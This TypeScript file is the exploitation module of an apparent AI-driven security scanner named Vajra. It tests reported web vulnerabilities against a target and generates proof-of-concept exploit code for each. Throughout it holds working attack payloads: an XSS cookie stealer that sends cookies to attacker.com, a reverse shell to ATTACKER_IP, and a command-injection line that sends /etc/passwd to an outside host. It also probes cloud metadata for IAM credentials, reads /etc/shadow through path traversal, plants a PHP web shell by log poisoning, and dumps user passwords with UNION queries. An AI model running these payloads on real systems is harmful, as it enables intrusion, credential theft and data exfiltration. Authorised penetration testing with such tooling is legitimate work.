/**
 * Vajra - AI-Powered Security Scanner
 * Exploitation Agent - Verifies and exploits vulnerabilities
 */

import axios, { AxiosInstance } from 'axios';
import {
  VajraConfig,
  TargetInfo,
  Vulnerability,
  VulnerabilityType,
  AgentResult,
  AgentType,
  ProofOfConcept,
  BrowserStep,
  Evidence,
  AIEngine,
  Logger,
} from '../types/index.js';
import { BrowserManager } from '../core/browser-manager.js';
import { v4 as uuidv4 } from 'uuid';

// ============================================================================
// Exploitation Agent
// ============================================================================

export class ExploitationAgent {
  private config: VajraConfig;
  private aiEngine: AIEngine;
  private browserManager: BrowserManager;
  private logger: Logger;
  private httpClient: AxiosInstance;
  
  constructor(
    config: VajraConfig,
    aiEngine: AIEngine,
    browserManager: BrowserManager,
    logger: Logger
  ) {
    this.config = config;
    this.aiEngine = aiEngine;
    this.browserManager = browserManager;
    this.logger = logger;
    
    this.httpClient = axios.create({
      timeout: config.scanning.timeout,
      headers: {
        'User-Agent': config.scanning.userAgent || 'Vajra/1.0 Security Scanner',
        ...config.scanning.headers,
      },
      validateStatus: () => true,
    });
  }
  
  /**
   * Verify a vulnerability by attempting exploitation
   */
  async verify(vulnerability: Vulnerability, targetInfo: TargetInfo): Promise<AgentResult> {
    const startTime = new Date();
    
    this.logger.info('Verifying vulnerability', {
      type: vulnerability.type,
      url: vulnerability.url,
    });
    
    try {
      const exploiter = this.getExploiter(vulnerability.type);
      const poc = await exploiter(vulnerability, targetInfo);
      
      if (poc) {
        return {
          agentId: 'exploit-agent',
          agentType: 'exploiter' as AgentType,
          status: 'success',
          data: poc,
          metrics: {
            startTime,
            endTime: new Date(),
            duration: Date.now() - startTime.getTime(),
            requestCount: 1,
            errorCount: 0,
            memoryUsage: process.memoryUsage().heapUsed,
          },
          timestamp: new Date(),
        };
      }
      
      return {
        agentId: 'exploit-agent',
        agentType: 'exploiter' as AgentType,
        status: 'partial',
        data: null,
        metrics: {
          startTime,
          endTime: new Date(),
          duration: Date.now() - startTime.getTime(),
          requestCount: 1,
          errorCount: 0,
          memoryUsage: process.memoryUsage().heapUsed,
        },
        timestamp: new Date(),
      };
    } catch (error) {
      this.logger.error('Exploitation failed', { error: String(error) });
      
      return {
        agentId: 'exploit-agent',
        agentType: 'exploiter' as AgentType,
        status: 'failed',
        data: null,
        errors: [{
          code: 'EXPLOIT_FAILED',
          message: String(error),
          recoverable: true,
        }],
        metrics: {
          startTime,
          endTime: new Date(),
          duration: Date.now() - startTime.getTime(),
          requestCount: 1,
          errorCount: 1,
          memoryUsage: process.memoryUsage().heapUsed,
        },
        timestamp: new Date(),
      };
    }
  }
  
  /**
   * Get the appropriate exploiter function
   */
  private getExploiter(type: VulnerabilityType): ExploiterFunction {
    switch (type) {
      case 'xss-reflected':
      case 'xss-stored':
      case 'xss-dom':
        return this.exploitXSS.bind(this);
      case 'sqli-error':
      case 'sqli-blind':
      case 'sqli-time':
      case 'sqli-union':
        return this.exploitSQLi.bind(this);
      case 'ssrf':
        return this.exploitSSRF.bind(this);
      case 'lfi':
        return this.exploitLFI.bind(this);
      case 'command-injection':
        return this.exploitCommandInjection.bind(this);
      case 'auth-bypass':
        return this.exploitAuthBypass.bind(this);
      case 'idor':
        return this.exploitIDOR.bind(this);
      default:
        return this.genericExploit.bind(this);
    }
  }
  
  // ============================================================================
  // XSS Exploitation
  // ============================================================================
  
  private async exploitXSS(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    const browserSteps: BrowserStep[] = [];
    
    // Step 1: Craft the exploit URL
    const exploitUrl = this.buildExploitUrl(vulnerability);
    steps.push(`1. Navigate to the vulnerable URL: ${exploitUrl}`);
    
    // Step 2: Execute in browser
    const page = await this.browserManager.newPage();
    
    try {
      // Take screenshot before
      await page.goto(vulnerability.url, { waitUntil: 'networkidle' });
      const beforeScreenshot = await page.screenshot({ fullPage: false });
      browserSteps.push({
        action: 'navigate',
        description: 'Navigate to the target page',
        screenshot: beforeScreenshot.toString('base64'),
      });
      
      // Navigate to exploit URL
      await page.goto(exploitUrl, { waitUntil: 'networkidle' });
      steps.push('2. The XSS payload executes in the browser context');
      
      // Take screenshot after
      const afterScreenshot = await page.screenshot({ fullPage: false });
      browserSteps.push({
        action: 'exploit',
        description: 'XSS payload executed',
        screenshot: afterScreenshot.toString('base64'),
      });
      
      // Generate curl command
      const curlCommand = this.generateCurlCommand(vulnerability);
      steps.push(`3. Alternative: Use curl to verify: ${curlCommand}`);
      
      // Generate exploit code
      const exploitCode = this.generateXSSExploitCode(vulnerability);
      
      return {
        steps,
        code: exploitCode,
        curlCommand,
        browserSteps,
      };
    } finally {
      await page.close();
    }
  }
  
  private generateXSSExploitCode(vulnerability: Vulnerability): string {
    return `// XSS Proof of Concept
// Vulnerability: ${vulnerability.title}
// URL: ${vulnerability.url}
// Parameter: ${vulnerability.parameter}

// Payload that triggers the XSS:
const payload = ${JSON.stringify(vulnerability.payload)};

// To exploit this vulnerability:
// 1. Craft a malicious URL with the payload
const maliciousUrl = new URL("${vulnerability.url}");
maliciousUrl.searchParams.set("${vulnerability.parameter}", payload);

// 2. Send this URL to a victim
console.log("Malicious URL:", maliciousUrl.toString());

// 3. When the victim clicks the link, the payload executes in their browser
// This could be used to:
// - Steal session cookies
// - Perform actions on behalf of the user
// - Redirect to phishing pages
// - Inject keyloggers

// Example cookie stealer payload:
const cookieStealerPayload = \`<script>
  new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
</script>\`;
`;
  }
  
  // ============================================================================
  // SQL Injection Exploitation
  // ============================================================================
  
  private async exploitSQLi(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    // Step 1: Identify the database type
    const dbType = this.identifyDatabaseType(vulnerability.evidence);
    steps.push(`1. Identified database type: ${dbType}`);
    
    // Step 2: Extract database version
    const versionPayload = this.getVersionPayload(dbType);
    steps.push(`2. Extract database version using: ${versionPayload}`);
    
    // Step 3: Enumerate databases
    const enumPayload = this.getEnumerationPayload(dbType);
    steps.push(`3. Enumerate databases using: ${enumPayload}`);
    
    // Step 4: Extract data
    steps.push('4. Extract sensitive data from identified tables');
    
    // Generate curl command
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    // Generate exploit code
    const exploitCode = this.generateSQLiExploitCode(vulnerability, dbType);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private identifyDatabaseType(evidence: Evidence): string {
    const body = evidence.response.body.toLowerCase();
    
    if (body.includes('mysql') || body.includes('mariadb')) return 'MySQL';
    if (body.includes('postgresql') || body.includes('pg_')) return 'PostgreSQL';
    if (body.includes('ora-') || body.includes('oracle')) return 'Oracle';
    if (body.includes('microsoft') || body.includes('mssql')) return 'MSSQL';
    if (body.includes('sqlite')) return 'SQLite';
    
    return 'Unknown';
  }
  
  private getVersionPayload(dbType: string): string {
    const payloads: Record<string, string> = {
      'MySQL': "' UNION SELECT @@version--",
      'PostgreSQL': "' UNION SELECT version()--",
      'Oracle': "' UNION SELECT banner FROM v$version--",
      'MSSQL': "' UNION SELECT @@version--",
      'SQLite': "' UNION SELECT sqlite_version()--",
    };
    
    return payloads[dbType] || "' UNION SELECT version()--";
  }
  
  private getEnumerationPayload(dbType: string): string {
    const payloads: Record<string, string> = {
      'MySQL': "' UNION SELECT table_name FROM information_schema.tables--",
      'PostgreSQL': "' UNION SELECT table_name FROM information_schema.tables--",
      'Oracle': "' UNION SELECT table_name FROM all_tables--",
      'MSSQL': "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
      'SQLite': "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    };
    
    return payloads[dbType] || "' UNION SELECT table_name FROM information_schema.tables--";
  }
  
  private generateSQLiExploitCode(vulnerability: Vulnerability, dbType: string): string {
    return `# SQL Injection Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}
# Parameter: ${vulnerability.parameter}
# Database: ${dbType}

import requests

target_url = "${vulnerability.url}"
vulnerable_param = "${vulnerability.parameter}"

# Step 1: Extract database version
version_payload = "${this.getVersionPayload(dbType)}"
response = requests.get(target_url, params={vulnerable_param: version_payload})
print(f"Database Version: {response.text}")

# Step 2: Enumerate tables
enum_payload = "${this.getEnumerationPayload(dbType)}"
response = requests.get(target_url, params={vulnerable_param: enum_payload})
print(f"Tables: {response.text}")

# Step 3: Extract data (example for users table)
data_payload = "' UNION SELECT username, password FROM users--"
response = requests.get(target_url, params={vulnerable_param: data_payload})
print(f"User Data: {response.text}")

# For automated exploitation, consider using sqlmap:
# sqlmap -u "${vulnerability.url}?${vulnerability.parameter}=test" --dbs
`;
  }
  
  // ============================================================================
  // SSRF Exploitation
  // ============================================================================
  
  private async exploitSSRF(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    // Step 1: Verify internal network access
    steps.push('1. Verify access to internal network resources');
    
    // Step 2: Attempt cloud metadata access
    steps.push('2. Attempt to access cloud metadata endpoints');
    const metadataPayloads = [
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    ];
    
    for (const payload of metadataPayloads) {
      const response = await this.testSSRFPayload(vulnerability, payload);
      if (response && response.includes('AccessKeyId')) {
        steps.push(`3. Successfully accessed AWS credentials via: ${payload}`);
        break;
      }
    }
    
    // Step 3: Port scanning
    steps.push('4. Internal port scanning is possible');
    
    const exploitCode = this.generateSSRFExploitCode(vulnerability);
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private async testSSRFPayload(vulnerability: Vulnerability, payload: string): Promise<string | null> {
    try {
      const url = new URL(vulnerability.url);
      if (vulnerability.parameter) {
        url.searchParams.set(vulnerability.parameter, payload);
      }
      
      const response = await this.httpClient.get(url.toString());
      return typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    } catch {
      return null;
    }
  }
  
  private generateSSRFExploitCode(vulnerability: Vulnerability): string {
    return `# SSRF Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}
# Parameter: ${vulnerability.parameter}

import requests

target_url = "${vulnerability.url}"
vulnerable_param = "${vulnerability.parameter}"

# AWS Metadata Exploitation
aws_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
]

for payload in aws_payloads:
    response = requests.get(target_url, params={vulnerable_param: payload})
    print(f"Payload: {payload}")
    print(f"Response: {response.text}\\n")

# Internal Port Scanning
internal_hosts = ["127.0.0.1", "10.0.0.1", "192.168.1.1"]
common_ports = [22, 80, 443, 3306, 5432, 6379, 27017]

for host in internal_hosts:
    for port in common_ports:
        payload = f"http://{host}:{port}/"
        try:
            response = requests.get(target_url, params={vulnerable_param: payload}, timeout=2)
            if response.status_code != 504:
                print(f"Open: {host}:{port}")
        except:
            pass
`;
  }
  
  // ============================================================================
  // LFI Exploitation
  // ============================================================================
  
  private async exploitLFI(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    // Step 1: Read sensitive files
    const sensitiveFiles = [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/proc/self/environ',
      '/var/log/apache2/access.log',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
    ];
    
    steps.push('1. Attempt to read sensitive system files');
    
    for (const file of sensitiveFiles) {
      const payload = `....//....//....//....//..../${file}`;
      const response = await this.testLFIPayload(vulnerability, payload);
      if (response) {
        steps.push(`2. Successfully read: ${file}`);
        break;
      }
    }
    
    // Step 2: Attempt log poisoning for RCE
    steps.push('3. Attempt log poisoning for potential RCE');
    
    const exploitCode = this.generateLFIExploitCode(vulnerability);
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private async testLFIPayload(vulnerability: Vulnerability, payload: string): Promise<string | null> {
    try {
      const url = new URL(vulnerability.url);
      if (vulnerability.parameter) {
        url.searchParams.set(vulnerability.parameter, payload);
      }
      
      const response = await this.httpClient.get(url.toString());
      const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
      
      // Check for file content indicators
      if (body.includes('root:') || body.includes('[extensions]')) {
        return body;
      }
      
      return null;
    } catch {
      return null;
    }
  }
  
  private generateLFIExploitCode(vulnerability: Vulnerability): string {
    return `# LFI Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}
# Parameter: ${vulnerability.parameter}

import requests

target_url = "${vulnerability.url}"
vulnerable_param = "${vulnerability.parameter}"

# Common LFI payloads
payloads = [
    "....//....//....//....//etc/passwd",
    "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
]

for payload in payloads:
    response = requests.get(target_url, params={vulnerable_param: payload})
    print(f"Payload: {payload}")
    print(f"Response: {response.text[:500]}\\n")

# Log Poisoning for RCE (if Apache logs are accessible)
# 1. Inject PHP code via User-Agent
headers = {"User-Agent": "<?php system($_GET['cmd']); ?>"}
requests.get(target_url, headers=headers)

# 2. Include the log file with command
log_payload = "....//....//....//var/log/apache2/access.log&cmd=id"
response = requests.get(target_url, params={vulnerable_param: log_payload})
print(f"RCE Result: {response.text}")
`;
  }
  
  // ============================================================================
  // Command Injection Exploitation
  // ============================================================================
  
  private async exploitCommandInjection(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    steps.push('1. Verify command execution capability');
    steps.push('2. Extract system information');
    steps.push('3. Establish reverse shell (if authorized)');
    
    const exploitCode = this.generateCommandInjectionExploitCode(vulnerability);
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private generateCommandInjectionExploitCode(vulnerability: Vulnerability): string {
    return `# Command Injection Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}
# Parameter: ${vulnerability.parameter}

import requests

target_url = "${vulnerability.url}"
vulnerable_param = "${vulnerability.parameter}"

# Basic command execution
payloads = [
    "; id",
    "| id",
    "\`id\`",
    "$(id)",
    "& whoami",
]

for payload in payloads:
    response = requests.get(target_url, params={vulnerable_param: f"test{payload}"})
    print(f"Payload: {payload}")
    print(f"Response: {response.text}\\n")

# Reverse Shell (use only with authorization!)
# Attacker: nc -lvnp 4444
# reverse_shell = "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# Data Exfiltration
exfil_payload = "; cat /etc/passwd | base64 | curl -d @- https://attacker.com/collect"
`;
  }
  
  // ============================================================================
  // Auth Bypass Exploitation
  // ============================================================================
  
  private async exploitAuthBypass(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    steps.push('1. Access protected endpoint without authentication');
    steps.push('2. Enumerate accessible resources');
    steps.push('3. Extract sensitive data');
    
    const exploitCode = this.generateAuthBypassExploitCode(vulnerability);
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private generateAuthBypassExploitCode(vulnerability: Vulnerability): string {
    return `# Authentication Bypass Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}

import requests

# Access protected endpoint without authentication
response = requests.get("${vulnerability.url}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")

# Common auth bypass techniques
bypass_headers = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

for headers in bypass_headers:
    response = requests.get("${vulnerability.url}", headers=headers)
    print(f"Headers: {headers}")
    print(f"Status: {response.status_code}\\n")
`;
  }
  
  // ============================================================================
  // IDOR Exploitation
  // ============================================================================
  
  private async exploitIDOR(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    steps.push('1. Identify the vulnerable parameter');
    steps.push('2. Enumerate valid object IDs');
    steps.push('3. Access other users\' data');
    
    const exploitCode = this.generateIDORExploitCode(vulnerability);
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      code: exploitCode,
      curlCommand,
    };
  }
  
  private generateIDORExploitCode(vulnerability: Vulnerability): string {
    return `# IDOR Proof of Concept
# Vulnerability: ${vulnerability.title}
# URL: ${vulnerability.url}
# Parameter: ${vulnerability.parameter}

import requests

target_url = "${vulnerability.url}"
vulnerable_param = "${vulnerability.parameter}"

# Enumerate user IDs
for user_id in range(1, 100):
    response = requests.get(target_url, params={vulnerable_param: user_id})
    if response.status_code == 200 and len(response.text) > 0:
        print(f"User ID {user_id}: {response.text[:200]}")

# Common IDOR patterns
patterns = [
    "1", "2", "100", "1000",
    "admin", "root", "test",
    "00000000-0000-0000-0000-000000000001",  # UUID
]

for pattern in patterns:
    response = requests.get(target_url, params={vulnerable_param: pattern})
    print(f"Pattern {pattern}: Status {response.status_code}")
`;
  }
  
  // ============================================================================
  // Generic Exploitation
  // ============================================================================
  
  private async genericExploit(
    vulnerability: Vulnerability,
    targetInfo: TargetInfo
  ): Promise<ProofOfConcept | null> {
    const steps: string[] = [];
    
    steps.push(`1. Identified vulnerability: ${vulnerability.type}`);
    steps.push(`2. Vulnerable URL: ${vulnerability.url}`);
    if (vulnerability.parameter) {
      steps.push(`3. Vulnerable parameter: ${vulnerability.parameter}`);
    }
    if (vulnerability.payload) {
      steps.push(`4. Payload used: ${vulnerability.payload}`);
    }
    
    const curlCommand = this.generateCurlCommand(vulnerability);
    
    return {
      steps,
      curlCommand,
    };
  }
  
  // ============================================================================
  // Helper Methods
  // ============================================================================
  
  private buildExploitUrl(vulnerability: Vulnerability): string {
    const url = new URL(vulnerability.url);
    
    if (vulnerability.parameter && vulnerability.payload) {
      url.searchParams.set(vulnerability.parameter, vulnerability.payload);
    }
    
    return url.toString();
  }
  
  private generateCurlCommand(vulnerability: Vulnerability): string {
    const url = this.buildExploitUrl(vulnerability);
    const method = vulnerability.evidence.request.method;
    
    let cmd = `curl -X ${method}`;
    
    // Add headers
    for (const [key, value] of Object.entries(vulnerability.evidence.request.headers)) {
      if (key.toLowerCase() !== 'host') {
        cmd += ` -H "${key}: ${value}"`;
      }
    }
    
    // Add body if present
    if (vulnerability.evidence.request.body) {
      cmd += ` -d '${vulnerability.evidence.request.body}'`;
    }
    
    cmd += ` "${url}"`;
    
    return cmd;
  }
}

// ============================================================================
// Types
// ============================================================================

type ExploiterFunction = (
  vulnerability: Vulnerability,
  targetInfo: TargetInfo
) => Promise<ProofOfConcept | null>;

export default ExploitationAgent;
